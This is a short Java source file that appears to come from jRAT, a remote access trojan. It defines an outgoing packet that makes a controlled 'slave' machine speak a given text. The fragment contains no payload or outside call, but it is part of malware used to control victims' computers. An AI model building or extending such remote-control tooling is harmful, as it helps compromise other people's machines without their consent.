package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet76Speech implements OutgoingPacket {

	private String text;

	public Packet76Speech(String text) {
		this.text = text;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(text);
	}

	@Override
	public short getPacketId() {
		return 76;
	}

}
